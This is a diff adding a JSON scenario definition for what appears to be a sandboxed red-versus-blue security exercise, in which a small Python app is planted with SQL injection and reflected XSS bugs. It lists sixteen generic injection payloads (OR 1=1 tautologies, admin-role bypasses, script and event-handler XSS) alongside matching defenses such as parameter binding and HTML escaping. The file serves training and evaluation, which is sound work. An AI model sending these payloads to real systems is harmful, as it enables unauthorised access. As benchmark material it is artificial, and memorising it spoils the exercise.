@@ -1,0 +1,198 @@
+{
+  "schema": "battle.scenario.v1",
+  "battle_id": "battle-005",
+  "scenario_id": "generated-sqli-xss-warm-pond-001",
+  "title": "Battle-005 generated warm-pond SQLi/XSS fanout",
+  "mode": "docker",
+  "docker_image": "python:3.12-slim",
+  "arena_team": {
+    "persona": "arena-team",
+    "role": "create_target_and_hidden_ground_truth",
+    "hidden_ground_truth": "hidden/ground-truth.json"
+  },
+  "target": {
+    "entrypoint": "app.py",
+    "language": "python",
+    "framework": "stdlib",
+    "description": "Small Python app with hidden SQL injection and reflected XSS vulnerabilities."
+  },
+  "commands": {
+    "expect_vulnerable": [
+      "python",
+      "exploit_check.py",
+      "--expect-vulnerable"
+    ],
+    "expect_safe": [
+      "python",
+      "exploit_check.py",
+      "--expect-safe"
+    ],
+    "regression": [
+      "python",
+      "-m",
+      "unittest",
+      "discover",
+      "-s",
+      "tests",
+      "-q"
+    ],
+    "fast_scan": [
+      "python",
+      "scanner.py",
+      "--json"
+    ]
+  },
+  "expected_changed_files": [
+    "app.py"
+  ],
+  "personas": {
+    "red": [
+      "brandon-bailey",
+      "horus-lupercal",
+      "sigmund-freud"
+    ],
+    "blue": [
+      "coder",
+      "embry-lawson",
+      "phalanx"
+    ],
+    "arena": [
+      "arena-team"
+    ],
+    "scorekeeper": [
+      "scorekeeper"
+    ]
+  },
+  "warm_pond_generator": {
+    "description": "Generate enough deterministic exploit/defense candidates for 64 replay attempts while keeping execution Docker-only.",
+    "exploit_payloads": [
+      {
+        "family": "sql_injection",
+        "symbol": "search_users",
+        "source": "scenario_warm_pond_generator",
+        "payloads": [
+          {
+            "id": "sqli-role-admin",
+            "payload": "nomatch%' OR role='admin' --"
+          },
+          {
+            "id": "sqli-username-admin",
+            "payload": "x%' OR username='admin' --"
+          },
+          {
+            "id": "sqli-like-admin",
+            "payload": "x%' OR username LIKE 'admin' --"
+          },
+          {
+            "id": "sqli-role-like-admin",
+            "payload": "x%' OR role LIKE 'admin' --"
+          },
+          {
+            "id": "sqli-tautology",
+            "payload": "x%' OR 1=1 --"
+          },
+          {
+            "id": "sqli-text-tautology",
+            "payload": "x%' OR 'a'='a' --"
+          },
+          {
+            "id": "sqli-in-admin",
+            "payload": "x%' OR username IN ('admin') --"
+          },
+          {
+            "id": "sqli-substr-admin",
+            "payload": "x%' OR substr(role,1,5)='admin' --"
+          }
+        ]
+      },
+      {
+        "family": "reflected_xss",
+        "symbol": "render_search",
+        "source": "scenario_warm_pond_generator",
+        "payloads": [
+          {
+            "id": "xss-script-alert",
+            "payload": "<script>alert(1)</script>"
+          },
+          {
+            "id": "xss-img-onerror",
+            "payload": "<img src=x onerror=alert(1)>"
+          },
+          {
+            "id": "xss-svg-onload",
+            "payload": "<svg onload=alert(1)>"
+          },
+          {
+            "id": "xss-attribute-breakout-generated",
+            "payload": "\" autofocus onfocus=alert(1) x=\""
+          },
+          {
+            "id": "xss-js-url",
+            "payload": "javascript:alert(1)"
+          },
+          {
+            "id": "xss-body-onload",
+            "payload": "<body onload=alert(1)>"
+          },
+          {
+            "id": "xss-details-toggle",
+            "payload": "<details open ontoggle=alert(1)>"
+          },
+          {
+            "id": "xss-template-breakout",
+            "payload": "</p><script>alert(1)</script>"
+          }
+        ]
+      }
+    ],
+    "defense_strategies": [
+      {
+        "family": "sql_injection",
+        "symbol": "search_users",
+        "source": "scenario_warm_pond_generator",
+        "strategies": [
+          {
+            "id": "sqli-parameterized-like",
+            "strategy": "Use sqlite parameter binding for LIKE queries."
+          },
+          {
+            "id": "sqli-query-builder",
+            "strategy": "Route all search predicates through a parameterized query builder."
+          },
+          {
+            "id": "sqli-input-length-cap",
+            "strategy": "Add bounded input length before parameterized search."
+          },
+          {
+            "id": "sqli-regression-oracle",
+            "strategy": "Add SQL injection regression probes to the scorekeeper replay."
+          }
+        ]
+      },
+      {
+        "family": "reflected_xss",
+        "symbol": "render_search",
+        "source": "scenario_warm_pond_generator",
+        "strategies": [
+          {
+            "id": "xss-html-escape",
+            "strategy": "HTML-escape reflected query before text or attribute rendering."
+          },
+          {
+            "id": "xss-attribute-escape",
+            "strategy": "Apply attribute-context escaping for value attributes."
+          },
+          {
+            "id": "xss-template-helper",
+            "strategy": "Centralize HTML rendering through a safe template helper."
+          },
+          {
+            "id": "xss-regression-oracle",
+            "strategy": "Add reflected XSS regression probes to the scorekeeper replay."
+          }
+        ]
+      }
+    ]
+  },
+  "stop_condition": "Arena plants hidden SQLi/XSS bugs; Red and Blue worker pools race through generated warm-pond combinations; Scorekeeper replays selected attempts in Docker."
+}
